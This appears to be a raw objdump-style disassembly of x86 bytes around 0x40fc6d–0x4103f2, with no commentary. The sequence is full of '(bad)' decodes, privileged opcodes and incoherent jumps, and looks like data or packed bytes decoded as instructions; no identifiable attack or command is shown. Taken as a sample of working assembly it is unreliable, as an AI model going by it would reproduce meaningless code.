  40fc6d:	add    edx,edi
  40fc6f:	repnz pop edx
  40fc71:	mov    dl,0xa9
  40fc73:	pop    ds
  40fc74:	dec    ecx
  40fc75:	icebp  
  40fc76:	and    DWORD PTR ss:[edx+0x29d33a6b],0xffffffa0
  40fc7e:	(bad)  
  40fc7f:	test   al,0xf7
  40fc81:	and    DWORD PTR [edi+0x24e15aeb],ebp
  40fc87:	cld    
  40fc88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc89:	cmp    DWORD PTR [ebp+0x5f],edx
  40fc8c:	daa    
  40fc8d:	js     0x40fc7d
  40fc8f:	sub    BYTE PTR [esi-0x78fd31fd],0x94
  40fc96:	test   BYTE PTR [ebx+0x56],al
  40fc99:	dec    eax
  40fc9a:	mov    bl,0x23
  40fc9c:	push   ecx
  40fc9d:	stos   BYTE PTR es:[edi],al
  40fc9e:	jl     0x40fc6f
  40fca0:	pop    edx
  40fca1:	aaa    
  40fca2:	add    eax,0xb2db2b82
  40fca7:	stc    
  40fca8:	and    BYTE PTR [eax+0x1709450c],dl
  40fcae:	aad    0xd
  40fcb0:	(bad)  
  40fcb1:	retf   
  40fcb2:	pop    ss
  40fcb3:	push   edi
  40fcb4:	jl     0x40fd05
  40fcb6:	pop    esp
  40fcb7:	pop    ebx
  40fcb8:	push   cs
  40fcb9:	xchg   esp,eax
  40fcba:	adc    dl,BYTE PTR [edi+0x34]
  40fcbd:	or     ecx,DWORD PTR [eax+ecx*2+0x1e]
  40fcc1:	iret   
  40fcc2:	add    dl,bl
  40fcc4:	not    DWORD PTR [esi+0x151dc006]
  40fcca:	shr    DWORD PTR [eax],1
  40fccc:	xlat   BYTE PTR ds:[ebx]
  40fccd:	test   eax,0x8d6b4036
  40fcd2:	xchg   BYTE PTR [esi-0x1f0d3327],ah
  40fcd8:	fs stos DWORD PTR es:[edi],eax
  40fcda:	(bad)  
  40fcdb:	dec    esi
  40fcdc:	pop    edi
  40fcdd:	std    
  40fcde:	mov    bh,0x62
  40fce0:	add    bh,al
  40fce2:	mov    ah,0xef
  40fce4:	push   ss
  40fce5:	clc    
  40fce6:	lds    ecx,FWORD PTR [esi]
  40fce8:	xor    edi,esi
  40fcea:	sti    
  40fceb:	xor    BYTE PTR [edx],bh
  40fced:	jge    0x40fc88
  40fcef:	popf   
  40fcf0:	xor    DWORD PTR [eax+0x634566af],edx
  40fcf6:	cs pusha 
  40fcf8:	dec    edi
  40fcf9:	fistp  DWORD PTR [esi]
  40fcfb:	in     al,dx
  40fcfc:	jns    0x40fcdc
  40fcfe:	mov    esi,0x551a48a1
  40fd03:	mov    eax,DWORD PTR [ebp-0x7aec7e02]
  40fd09:	cmc    
  40fd0a:	lods   al,BYTE PTR ds:[esi]
  40fd0b:	pand   mm6,mm5
  40fd0e:	push   es
  40fd0f:	cli    
  40fd10:	jmp    0x40fcc1
  40fd12:	mov    ?,WORD PTR ss:0x40327273
  40fd19:	push   edi
  40fd1a:	loopne 0x40fce7
  40fd1c:	call   0xbe02:0xa4afee00
  40fd23:	out    dx,al
  40fd24:	dec    eax
  40fd25:	aad    0xbd
  40fd27:	shl    edx,cl
  40fd29:	(bad)  
  40fd2b:	fnsetpm(287 only) 
  40fd2d:	pop    ebx
  40fd2e:	pop    es
  40fd2f:	test   ebx,ebp
  40fd31:	(bad)
  40fd34:	aas    
  40fd35:	dec    esp
  40fd36:	in     eax,dx
  40fd37:	js     0x40fd9a
  40fd39:	adc    edi,DWORD PTR [eax+edx*1+0x5610848a]
  40fd40:	jns    0x40fda7
  40fd42:	xor    DWORD PTR [esi+0x4045f1e9],ebp
  40fd48:	test   eax,0x4ff5030b
  40fd4d:	(bad)  
  40fd4e:	nop
  40fd4f:	stc    
  40fd50:	ja     0x40fd07
  40fd52:	mov    ss,WORD PTR [esp+edi*8]
  40fd55:	xchg   ecx,eax
  40fd56:	xor    DWORD PTR [ebp+eax*4+0x4b4b9b7b],edx
  40fd5d:	ja     0x40fda0
  40fd5f:	test   BYTE PTR [ebx-0x6],bl
  40fd62:	sbb    ax,0xdf01
  40fd66:	pop    edx
  40fd67:	popa   
  40fd68:	mov    bl,BYTE PTR [edx+0x75b070c7]
  40fd6e:	stc    
  40fd6f:	arpl   WORD PTR [ecx],bx
  40fd71:	call   FWORD PTR [ebp+0x30]
  40fd74:	fcom   DWORD PTR [ebx-0x21db71ec]
  40fd7a:	pop    es
  40fd7b:	add    BYTE PTR [edi+0x4e],0x88
  40fd7f:	jmp    0xd6944fdd
  40fd84:	pop    ds
  40fd85:	mov    edi,0xd2cd7fdf
  40fd8a:	push   ss
  40fd8b:	or     dh,0x69
  40fd8e:	xchg   ebx,eax
  40fd8f:	sbb    BYTE PTR [eax+0x61667a5c],ch
  40fd95:	in     al,dx
  40fd96:	(bad)  
  40fd97:	xchg   edx,eax
  40fd98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd99:	lock xchg esi,eax
  40fd9b:	xchg   ecx,eax
  40fd9c:	mov    cl,0x90
  40fd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd9f:	inc    ecx
  40fda0:	sbb    BYTE PTR [edx+0x7e],0x44
  40fda4:	cwde   
  40fda5:	xor    al,0xd8
  40fda7:	push   ecx
  40fda8:	mov    ecx,0x96c7e66b
  40fdad:	or     eax,0x534df76
  40fdb2:	call   0x3e0299b8
  40fdb7:	mov    ch,0x66
  40fdb9:	scas   eax,DWORD PTR es:[edi]
  40fdba:	das    
  40fdbb:	setp   ch
  40fdbe:	or     ch,dl
  40fdc0:	scas   eax,DWORD PTR es:[edi]
  40fdc1:	inc    edi
  40fdc2:	cmp    eax,0x51787daa
  40fdc7:	mov    al,ds:0xeafd2025
  40fdcc:	mov    esp,DWORD PTR [edx+0x32]
  40fdcf:	mov    cs,edx
  40fdd1:	jge    0x40fe3c
  40fdd3:	pop    edx
  40fdd4:	sbb    DWORD PTR [esi-0x647a21b7],esi
  40fdda:	dec    ebx
  40fddb:	fist   DWORD PTR [edi-0x3b33a076]
  40fde1:	add    ch,BYTE PTR [bp-0x72]
  40fde5:	inc    eax
  40fde6:	push   ecx
  40fde7:	push   edi
  40fde8:	aaa    
  40fde9:	lods   eax,DWORD PTR ds:[esi]
  40fdea:	or     esi,edx
  40fdec:	cwde   
  40fded:	rcl    BYTE PTR [ecx],0x75
  40fdf0:	fadd   st(1),st
  40fdf2:	or     esi,DWORD PTR [eax+0x2f]
  40fdf5:	push   eax
  40fdf6:	push   edx
  40fdf7:	sbb    al,0x3f
  40fdf9:	lods   eax,DWORD PTR ds:[esi]
  40fdfa:	std    
  40fdfb:	rcr    BYTE PTR [edx-0x3229983d],cl
  40fe01:	or     al,0x78
  40fe03:	loopne 0x40fe5b
  40fe05:	out    0x9b,eax
  40fe07:	ret    
  40fe08:	iret   
  40fe09:	mov    eax,0x90db3eb2
  40fe0e:	cmc    
  40fe0f:	cmp    bh,dh
  40fe11:	mov    ch,0x63
  40fe13:	fsubr  QWORD PTR [ebx]
  40fe15:	stos   BYTE PTR es:[edi],al
  40fe16:	jp     0x40fdfd
  40fe18:	jmp    0x40fe35
  40fe1a:	push   0xbb607dea
  40fe1f:	mov    dl,0xb3
  40fe21:	cmp    al,0xe4
  40fe23:	add    ecx,ebp
  40fe25:	daa    
  40fe26:	int3   
  40fe27:	ins    BYTE PTR es:[edi],dx
  40fe28:	push   0xffffffc3
  40fe2a:	and    ecx,DWORD PTR [ebx+ebx*8+0x7e]
  40fe2e:	jge    0x40fe7b
  40fe30:	aam    0x29
  40fe32:	xchg   esi,eax
  40fe33:	xor    edx,DWORD PTR [ebp+0x20]
  40fe36:	mov    eax,DWORD PTR [esi+ebx*8]
  40fe39:	mov    eax,ds:0x65c95143
  40fe3e:	dec    ecx
  40fe3f:	xchg   dh,bl
  40fe41:	inc    esi
  40fe42:	jb     0x40fe5c
  40fe44:	dec    ebp
  40fe45:	mov    al,0x19
  40fe47:	rol    BYTE PTR [ecx+ecx*1-0x29],0x67
  40fe4c:	mov    fs,WORD PTR [ebx+ebx*8-0x61]
  40fe50:	test   al,0x11
  40fe52:	in     al,0xfd
  40fe54:	repz xchg ebx,eax
  40fe56:	sbb    BYTE PTR [ecx+eiz*2+0x6f0bdc68],dh
  40fe5d:	push   ebx
  40fe5e:	cvtsd2ss xmm3,QWORD PTR [edx+0x3606b29c]
  40fe66:	retf   
  40fe67:	cmp    dh,BYTE PTR [esp+eax*2]
  40fe6a:	test   DWORD PTR [eax],edi
  40fe6c:	xchg   ebx,eax
  40fe6d:	mov    ecx,0x1dd990c0
  40fe72:	retf   0x288f
  40fe75:	clc    
  40fe76:	gs fwait
  40fe78:	adc    esi,DWORD PTR [ecx-0x28dce7f7]
  40fe7e:	call   0x886a1fe5
  40fe83:	inc    eax
  40fe84:	jmp    0x40fe9c
  40fe86:	mov    ch,BYTE PTR ds:0x73e04d10
  40fe8c:	xchg   ebp,eax
  40fe8d:	pop    eax
  40fe8e:	add    DWORD PTR [ebp+0x44],0x1a
  40fe92:	jmp    0x40fe4a
  40fe94:	stc    
  40fe95:	xchg   DWORD PTR [eax+edx*1],ebp
  40fe98:	pop    eax
  40fe99:	ins    DWORD PTR es:[edi],dx
  40fe9a:	inc    ebp
  40fe9b:	es data16 mov dh,0x71
  40fe9f:	adc    DWORD PTR [esi+0x21],esi
  40fea2:	adc    eax,0xeea235ad
  40fea7:	mov    edx,0x1fa078df
  40feac:	imul   ecx,DWORD PTR [eax-0x67],0xbae68eb9
  40feb3:	adc    BYTE PTR [esi-0x25],bl
  40feb6:	or     DWORD PTR [ecx],edi
  40feb8:	out    dx,eax
  40feb9:	cld    
  40feba:	pushf  
  40febb:	mov    ecx,0x89a935af
  40fec0:	retf   
  40fec1:	mov    cs,WORD PTR [ebp-0xdb180a0]
  40fec7:	dec    esp
  40fec8:	mov    ebx,ds
  40feca:	xor    cl,BYTE PTR [edx+0x32160d06]
  40fed0:	ins    DWORD PTR es:[edi],dx
  40fed1:	clc    
  40fed2:	leave  
  40fed3:	ror    DWORD PTR ds:0x2c7e3910,0x78
  40feda:	fidiv  DWORD PTR [ebx]
  40fedc:	je     0x40febd
  40fede:	inc    ecx
  40fedf:	cs (bad) 
  40fee1:	pop    eax
  40fee2:	and    BYTE PTR [ebx],dl
  40fee4:	clc    
  40fee5:	pushf  
  40fee6:	ins    BYTE PTR es:[di],dx
  40fee8:	xor    BYTE PTR [edi],bl
  40feea:	cmp    eax,0x17af5eab
  40feef:	iret   
  40fef0:	pop    eax
  40fef1:	xchg   ebp,eax
  40fef2:	xlat   BYTE PTR ds:[ebx]
  40fef3:	xchg   ebp,eax
  40fef4:	jo     0x40ff12
  40fef6:	adc    al,0xe0
  40fef8:	sub    bl,al
  40fefa:	mov    ah,0x49
  40fefc:	addr16 push es
  40fefe:	xor    eax,0x39ff8692
  40ff03:	sbb    eax,0xb75c91ba
  40ff08:	les    ebp,FWORD PTR [eax]
  40ff0a:	inc    ebx
  40ff0b:	mov    ah,0xe
  40ff0d:	xlat   BYTE PTR ds:[ebx]
  40ff0e:	ror    BYTE PTR [edi+0x4f1960bd],cl
  40ff14:	push   0x79d74ee9
  40ff19:	or     ah,dl
  40ff1b:	rcl    al,1
  40ff1d:	add    eax,0x61e8e44e
  40ff22:	sub    al,BYTE PTR [edx]
  40ff24:	adc    al,0xba
  40ff26:	mov    esp,0xa807ae1b
  40ff2b:	je     0x40ff80
  40ff2d:	lahf   
  40ff2e:	jge    0x40ff9a
  40ff30:	dec    ecx
  40ff31:	dec    esp
  40ff32:	or     cl,BYTE PTR [ebx]
  40ff34:	xchg   esp,eax
  40ff35:	push   eax
  40ff36:	xchg   ebp,eax
  40ff37:	loope  0x40ff36
  40ff39:	dec    edx
  40ff3a:	jmp    0xece50aeb
  40ff3f:	cwde   
  40ff40:	bound  eax,QWORD PTR [edi+0xbb9e257]
  40ff46:	mov    ecx,cs
  40ff48:	pop    edx
  40ff49:	in     al,0x42
  40ff4b:	add    al,BYTE PTR [eax-0x15]
  40ff4e:	xchg   ebx,eax
  40ff4f:	ja     0x40ff48
  40ff51:	fstp   TBYTE PTR [ecx-0x6]
  40ff54:	adc    DWORD PTR [eax+0x6e54db55],esi
  40ff5a:	retf   
  40ff5b:	cmp    BYTE PTR [esi+0x1a],ch
  40ff5e:	push   cs
  40ff5f:	fcom   st(0)
  40ff61:	stos   DWORD PTR es:[edi],eax
  40ff62:	aam    0x68
  40ff64:	add    cl,0xda
  40ff67:	ret    
  40ff68:	mov    bh,0xc0
  40ff6a:	xchg   ebp,eax
  40ff6b:	push   ebp
  40ff6c:	add    BYTE PTR ds:[ecx+0x5fb90a5],al
  40ff73:	test   DWORD PTR [ebx-0x56bdb8bf],edx
  40ff79:	int3   
  40ff7a:	jb     0x40ffca
  40ff7c:	fs call 0x36aae833
  40ff82:	dec    BYTE PTR [esi+eax*1]
  40ff85:	jae    0x40ff14
  40ff87:	xchg   ebx,eax
  40ff88:	jge    0x40ff1a
  40ff8a:	inc    edi
  40ff8b:	shr    DWORD PTR [ecx+0x6d5781fd],cl
  40ff91:	mov    ah,BYTE PTR [eax-0x24]
  40ff94:	fucomi st,st(1)
  40ff96:	and    eax,0x224063e7
  40ff9b:	push   ecx
  40ff9c:	xor    edx,ecx
  40ff9e:	inc    ebx
  40ff9f:	push   esp
  40ffa0:	xchg   DWORD PTR [eax+ebx*2],ecx
  40ffa3:	push   ss
  40ffa4:	jge    0x40ff65
  40ffa6:	sbb    DWORD PTR [edi-0x4b0dcacd],esp
  40ffac:	dec    esi
  40ffad:	outs   dx,DWORD PTR ds:[esi]
  40ffae:	jbe    0x40ff64
  40ffb0:	xor    DWORD PTR ds:0x9da07868,ebp
  40ffb6:	or     ecx,edx
  40ffb8:	out    0x6c,al
  40ffba:	fisttp DWORD PTR [eax+0x567385d3]
  40ffc0:	test   BYTE PTR [edi+ebp*8-0x3d],dl
  40ffc4:	add    BYTE PTR [esi+0x4c],dl
  40ffc7:	add    BYTE PTR [edi],dl
  40ffc9:	lock loope 0x41004b
  40ffcc:	dec    ebp
  40ffcd:	div    BYTE PTR [esi+0x7]
  40ffd0:	into   
  40ffd1:	adc    eax,0x1d9d0548
  40ffd6:	das    
  40ffd7:	mov    ch,BYTE PTR [di-0xc4c]
  40ffdc:	jl     0x40ff97
  40ffde:	cs out dx,al
  40ffe0:	pop    DWORD PTR [eax]
  40ffe2:	mov    esi,0xe0cef428
  40ffe7:	popa   
  40ffe8:	pop    ss
  40ffe9:	repnz push ds
  40ffeb:	dec    ebp
  40ffec:	sbb    BYTE PTR [ebp-0x80],al
  40ffef:	mov    bl,0x2d
  40fff1:	pop    es
  40fff2:	pop    ebx
  40fff3:	movhps xmm2,QWORD PTR [edi-0x35]
  40fff7:	mov    ebx,0x860581da
  40fffc:	fwait
  40fffd:	popf   
  40fffe:	aad    0xa9
  410000:	(bad)  
  410001:	pop    ebx
  410002:	icebp  
  410003:	call   0xeabb2fc7
  410008:	(bad)  
  410009:	loopne 0x40ffe2
  41000b:	sub    DWORD PTR [esi-0x15fec47b],esp
  410011:	cli    
  410012:	add    DWORD PTR [eax+0x49],esi
  410015:	inc    ebp
  410016:	or     ch,BYTE PTR [ecx]
  410018:	int3   
  410019:	and    eax,0x189bc6f5
  41001e:	push   ecx
  41001f:	mov    ebp,0xca318473
  410024:	rcl    WORD PTR [ebp-0x72fad86],cl
  41002b:	aas    
  41002c:	and    esp,DWORD PTR [esi]
  41002e:	lods   al,BYTE PTR ds:[esi]
  41002f:	and    eax,ebx
  410031:	adc    eax,0xb54336e0
  410036:	mov    WORD PTR [ebx],fs
  410038:	clc    
  410039:	dec    ebx
  41003a:	mov    edx,0x334d9ac7
  41003f:	mov    eax,0x9f9a083e
  410044:	jmp    0x5ed607e3
  410049:	mov    DWORD PTR [eax],edi
  41004b:	or     eax,0x9e0414be
  410050:	(bad)  
  410051:	in     al,dx
  410052:	jmp    0xd894:0x1ff80567
  410059:	or     ecx,esp
  41005b:	or     BYTE PTR [edx-0x36],dl
  41005e:	loop   0x4100ca
  410060:	dec    edi
  410061:	mov    ch,0xdb
  410063:	stos   DWORD PTR es:[edi],eax
  410064:	pop    ebp
  410065:	add    DWORD PTR [ecx],edx
  410067:	ficomp WORD PTR [ebx-0x24738215]
  41006d:	aad    0xae
  41006f:	mov    dl,0xe1
  410071:	dec    edi
  410072:	enter  0x6119,0x26
  410076:	pop    edi
  410077:	int3   
  410078:	call   0x432c:0xcb5e3f0a
  41007f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410080:	cmp    eax,0xa4e0b7e4
  410085:	adc    al,0x75
  410087:	ja     0x410066
  410089:	jmp    0x41001b
  41008b:	add    eax,0x72b201d8
  410090:	repz xlat BYTE PTR ds:[ebx]
  410092:	xor    bl,ah
  410094:	pusha  
  410095:	dec    ebx
  410096:	mov    ds:0xbf6d02ba,eax
  41009b:	sahf   
  41009c:	sar    edx,cl
  41009e:	sbb    DWORD PTR [ebp+0x78],ecx
  4100a1:	pop    ss
  4100a2:	jne    0x41009f
  4100a4:	mov    ds:0x8600e8f,al
  4100a9:	call   0xd9137504
  4100ae:	out    0xcf,al
  4100b0:	lahf   
  4100b1:	dec    esp
  4100b2:	xor    DWORD PTR [ebx-0x8d8b22c],0xb9971b25
  4100bc:	push   es
  4100bd:	js     0x4100b5
  4100bf:	mov    DWORD PTR [edx-0x10ba0da1],ebx
  4100c5:	outs   dx,BYTE PTR ds:[esi]
  4100c6:	out    dx,al
  4100c7:	push   ds
  4100c8:	mov    ebx,eax
  4100ca:	int3   
  4100cb:	loop   0x41014b
  4100cd:	adc    BYTE PTR [edi+0x3244bf29],bl
  4100d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100d4:	pushf  
  4100d5:	inc    esi
  4100d6:	mov    ds:0xfc579af9,eax
  4100db:	fucomi st,st(4)
  4100dd:	or     al,0xc3
  4100df:	adc    ebx,ecx
  4100e1:	sbb    BYTE PTR [ebp-0x21d3672b],0x3b
  4100e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e9:	xchg   esi,ebp
  4100eb:	in     al,dx
  4100ec:	push   esi
  4100ed:	in     eax,dx
  4100ee:	xchg   ebx,eax
  4100ef:	cmp    BYTE PTR [edx-0x1946e3ce],dl
  4100f5:	(bad)  
  4100f6:	adc    al,0xe3
  4100f8:	jno    0x410147
  4100fa:	je     0x41010e
  4100fc:	pop    ebx
  4100fd:	in     eax,0x49
  4100ff:	mov    eax,cs:0xfaf8a5bf
  410105:	lods   al,BYTE PTR ds:[esi]
  410106:	add    edi,ecx
  410108:	push   ecx
  410109:	xor    DWORD PTR [esi-0x47853d08],esp
  41010f:	rcl    DWORD PTR [esi+0x62],cl
  410112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410113:	mov    ds:0xf6976cc4,eax
  410118:	fs gs jae 0x410119
  41011c:	repz xchg bh,bh
  41011f:	(bad)  
  410120:	xchg   ecx,eax
  410121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410122:	retf   
  410123:	dec    esp
  410124:	cdq    
  410125:	and    DWORD PTR [eax+0xe69a5],ebx
  41012b:	fs in  al,dx
  41012d:	popf   
  41012e:	jp     0x410186
  410130:	ret    
  410131:	cmc    
  410132:	fild   WORD PTR [eax]
  410134:	dec    esp
  410135:	in     al,0x91
  410137:	push   ds
  410138:	out    0xf7,al
  41013a:	cwde   
  41013b:	lahf   
  41013c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41013d:	outs   dx,BYTE PTR ds:[esi]
  41013e:	push   ss
  41013f:	lods   al,BYTE PTR ds:[esi]
  410140:	inc    eax
  410141:	nop
  410142:	pop    ds
  410143:	sar    DWORD PTR [ebp+0xe447811],0x49
  41014a:	mov    eax,ds:0xb9726e96
  41014f:	mov    es,WORD PTR [ebp+esi*2-0x2a0ff305]
  410156:	pop    edi
  410157:	(bad)  
  410158:	hlt    
  410159:	mov    bl,bh
  41015b:	xor    al,0xff
  41015d:	icebp  
  41015e:	xlat   BYTE PTR ds:[ebx]
  41015f:	jg     0x41010c
  410161:	cmp    ch,BYTE PTR [esi+0x70]
  410164:	inc    ebp
  410165:	int3   
  410166:	mov    ecx,0x9784aace
  41016b:	retf   
  41016c:	stos   BYTE PTR es:[edi],al
  41016d:	cmp    esp,DWORD PTR [esi+edi*2+0x42]
  410171:	cli    
  410172:	mov    ebx,DWORD PTR [edx-0x17]
  410175:	dec    eax
  410176:	adc    edi,DWORD PTR [ebx-0x46]
  410179:	and    eax,0xe186ca41
  41017e:	lods   eax,DWORD PTR ds:[esi]
  41017f:	cmc    
  410180:	mov    ds:0x7380a10d,al
  410185:	xor    BYTE PTR [ebx+0x64],al
  410188:	ja     0x410127
  41018a:	in     al,0x21
  41018c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41018d:	mov    ?,WORD PTR [esi]
  41018f:	xchg   ebp,eax
  410190:	cmp    eax,0x7f9c406a
  410195:	jo     0x41016d
  410197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410199:	imul   edi,DWORD PTR [eax],0x5fcf2232
  41019f:	push   es
  4101a0:	or     eax,0x32ef74ab
  4101a5:	ins    DWORD PTR es:[edi],dx
  4101a6:	mov    ch,0x81
  4101a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101a9:	fwait
  4101aa:	sbb    esi,esp
  4101ac:	imul   edi,DWORD PTR [esi+0x4c1c6a06],0xc74040cd
  4101b6:	push   ebp
  4101b7:	or     al,0x9
  4101b9:	sbb    cl,dl
  4101bb:	ds mov dl,0xc0
  4101be:	loopne 0x410200
  4101c0:	out    dx,al
  4101c1:	push   cs
  4101c2:	inc    esi
  4101c3:	in     eax,dx
  4101c4:	push   0x1c
  4101c6:	pop    ebp
  4101c7:	push   ds
  4101c8:	js     0x4101fd
  4101ca:	out    0x82,al
  4101cc:	inc    ecx
  4101cd:	hlt    
  4101ce:	mov    al,ds:0x52d4f34e
  4101d3:	jne    0x4101e2
  4101d5:	std    
  4101d6:	sub    edx,0x45a3d8e5
  4101dc:	repz adc edi,ebp
  4101df:	jo     0x4101cc
  4101e1:	in     al,dx
  4101e2:	mov    ch,0x96
  4101e4:	ins    BYTE PTR es:[edi],dx
  4101e5:	shl    DWORD PTR [edi-0x1e6cbf74],0x5a
  4101ec:	cmp    eax,edi
  4101ee:	adc    eax,0x87a1a326
  4101f3:	fcom   st(2)
  4101f5:	cld    
  4101f6:	pop    ss
  4101f7:	arpl   WORD PTR [edi],sp
  4101f9:	rcr    esi,1
  4101fb:	dec    edi
  4101fc:	mov    ecx,0x785694cc
  410201:	pop    edi
  410202:	les    edi,FWORD PTR [ecx-0x5a]
  410205:	in     eax,dx
  410206:	aam    0xae
  410208:	mov    WORD PTR [ebp-0x5fc41b36],?
  41020e:	pop    ecx
  41020f:	test   al,0xec
  410211:	aad    0x7f
  410213:	jns    0x410234
  410215:	stos   DWORD PTR es:[edi],eax
  410216:	enter  0x9b98,0x58
  41021a:	xchg   edi,eax
  41021b:	icebp  
  41021c:	pushf  
  41021d:	scas   eax,DWORD PTR es:[edi]
  41021e:	mov    ah,0xdc
  410220:	mov    al,0x1a
  410222:	test   DWORD PTR [edx+ecx*8+0x6f],0xb86bca4c
  41022a:	xor    eax,edx
  41022c:	call   0x35e80af
  410231:	push   ebx
  410232:	mov    ebp,0x1677313a
  410237:	repnz std 
  410239:	sbb    eax,0x9e8ba169
  41023e:	and    al,0xfa
  410240:	add    bl,BYTE PTR [ecx-0x39]
  410243:	jbe    0x410210
  410245:	mov    ah,BYTE PTR [ebp+0x7385ec48]
  41024b:	cwde   
  41024c:	ss cmp eax,0x373af51e
  410252:	mov    edi,0x9882b224
  410257:	cmp    al,0xfb
  410259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41025a:	mov    ds:0xfd49036c,al
  41025f:	lahf   
  410260:	inc    eax
  410261:	int    0xea
  410263:	bound  edi,QWORD PTR [edx+ebx*8+0x557dfff7]
  41026a:	sub    eax,0xec9b8de9
  41026f:	pop    ds
  410270:	pop    esi
  410271:	xchg   BYTE PTR [edi],ch
  410273:	fdiv   st,st(7)
  410275:	scas   eax,DWORD PTR es:[edi]
  410276:	dec    esp
  410277:	lea    ecx,[esi]
  410279:	cs mov edi,0x7262ed42
  41027f:	(bad)  
  410280:	mov    eax,ds:0x84332027
  410285:	mov    al,0xb6
  410287:	xchg   ebx,eax
  410288:	fdiv   DWORD PTR ds:0xbae656fd
  41028e:	lea    esp,[eax+0x602cadb0]
  410294:	jns    0x410308
  410296:	ret    
  410297:	repz jb 0x410260
  41029a:	cwde   
  41029b:	mov    edi,0x54db5dc
  4102a0:	xchg   esp,eax
  4102a1:	fadd   QWORD PTR [edx+0x2ba86988]
  4102a8:	sub    al,0x78
  4102aa:	fild   WORD PTR [esi+0x68]
  4102ad:	lds    esp,FWORD PTR [edx-0x3cd428a2]
  4102b3:	ret    
  4102b4:	imul   esp,esi,0x49
  4102b7:	ja     0x41030d
  4102b9:	outs   dx,DWORD PTR ds:[esi]
  4102ba:	xor    ch,ch
  4102bc:	das    
  4102bd:	or     BYTE PTR [eax],cl
  4102bf:	imul   BYTE PTR [edi-0x15ef82d9]
  4102c5:	loope  0x4102bd
  4102c7:	jmp    0xafb3:0x5b52f14b
  4102ce:	iret   
  4102cf:	stos   DWORD PTR es:[edi],eax
  4102d0:	inc    ecx
  4102d1:	mov    WORD PTR [ebx],ss
  4102d3:	mov    esp,ds
  4102d5:	fistp  DWORD PTR [esi]
  4102d7:	push   0x9
  4102d9:	in     al,dx
  4102da:	cmc    
  4102db:	in     al,0x70
  4102dd:	mov    ds:0xdbbd82cc,al
  4102e2:	ja     0x41031c
  4102e4:	push   ecx
  4102e5:	stos   BYTE PTR es:[edi],al
  4102e6:	shl    DWORD PTR [esi],0x11
  4102e9:	data16 (bad) 
  4102eb:	cmp    al,0x3d
  4102ed:	xor    eax,0x1e7806f6
  4102f2:	pop    ss
  4102f3:	add    eax,0xde153222
  4102f8:	sub    esi,DWORD PTR [esi-0x7]
  4102fb:	lods   eax,DWORD PTR ds:[esi]
  4102fc:	or     edx,DWORD PTR [ebx]
  4102fe:	jnp    0x4102f0
  410300:	in     al,dx
  410301:	mov    eax,0x248e3c8f
  410306:	xor    al,0x1f
  410308:	pop    edx
  410309:	aad    0x91
  41030b:	sbb    edi,DWORD PTR [ecx+0x5d]
  41030e:	out    dx,ax
  410310:	xchg   BYTE PTR [ecx-0x1d02a260],ah
  410316:	test   al,0x50
  410318:	or     DWORD PTR [eax+0x54],eax
  41031b:	pop    eax
  41031c:	inc    esp
  41031d:	and    BYTE PTR [esi],dl
  41031f:	or     BYTE PTR [edx+0x3cd9d266],bl
  410325:	sbb    esi,ebp
  410327:	aam    0x60
  410329:	or     bl,BYTE PTR [ebx]
  41032b:	add    BYTE PTR [ebp+0x6293cff8],0x30
  410332:	jge    0x410330
  410334:	data16 jne 0x4102e5
  410337:	jb     0x410331
  410339:	push   eax
  41033a:	idiv   DWORD PTR [ecx-0x4059713c]
  410340:	adc    DWORD PTR [edx],esp
  410342:	cmp    BYTE PTR [ecx],0x6d
  410345:	jmp    DWORD PTR ds:0xe7436701
  41034b:	push   esi
  41034c:	xlat   BYTE PTR ds:[ebx]
  41034d:	jp     0x410361
  41034f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410350:	pop    edi
  410351:	adc    BYTE PTR [edx+0x406ad429],bh
  410357:	int3   
  410358:	imul   esp,DWORD PTR [eax+eax*1],0x3d5a044c
  41035f:	xchg   ebx,eax
  410360:	mov    bh,0xf3
  410362:	inc    esp
  410363:	cdq    
  410364:	in     al,0x39
  410366:	test   al,0x66
  410368:	adc    bh,dl
  41036a:	jp     0x4103b4
  41036c:	xchg   eax,edi
  41036e:	call   0xdb4eaa97
  410373:	push   eax
  410374:	repnz (bad)
  410377:	in     al,dx
  410378:	pop    ebp
  410379:	push   esi
  41037a:	lds    edi,FWORD PTR ds:0x23464642
  410380:	jmp    0x7741bb0f
  410385:	dec    eax
  410386:	inc    edx
  410387:	adc    esi,DWORD PTR [esp+edx*4]
  41038a:	jb     0x410392
  41038c:	xor    bl,cl
  41038e:	and    ecx,eax
  410390:	adc    ebx,DWORD PTR [ebx+0x1b]
  410393:	fmul   st(0),st
  410395:	out    dx,eax
  410396:	push   cs
  410397:	imul   BYTE PTR [edi]
  410399:	outs   dx,DWORD PTR ds:[esi]
  41039a:	mov    eax,ds:0x6fc1aca5
  41039f:	sbb    al,0xc0
  4103a1:	mov    edi,0xf84cc69a
  4103a6:	jg     0x41035e
  4103a8:	xchg   esp,eax
  4103a9:	ret    0xc020
  4103ac:	jg     0x410357
  4103ae:	loopne 0x410398
  4103b0:	call   0xd3f566e2
  4103b5:	push   edx
  4103b6:	aas    
  4103b7:	sbb    bl,BYTE PTR [eax-0x51]
  4103ba:	dec    edi
  4103bb:	xor    eax,0x3164d17e
  4103c0:	adc    ch,BYTE PTR [ebx]
  4103c2:	cmp    al,0x81
  4103c4:	mov    esi,0xf5f008f4
  4103c9:	adc    DWORD PTR [ebx],0x6550b9a2
  4103cf:	mov    ecx,0x23f9e89f
  4103d4:	ss int3 
  4103d6:	jecxz  0x410452
  4103d8:	dec    esp
  4103d9:	mov    eax,0x4bfe21dd
  4103df:	loop   0x41043c
  4103e1:	mov    ch,0xea
  4103e3:	and    eax,DWORD PTR [ebp+0x49cadc77]
  4103e9:	rcl    BYTE PTR [edi-0x6b2b480c],cl
  4103ef:	bnd jmp 0x41041b
  4103f2:	dec    DWORD PTR [esi]
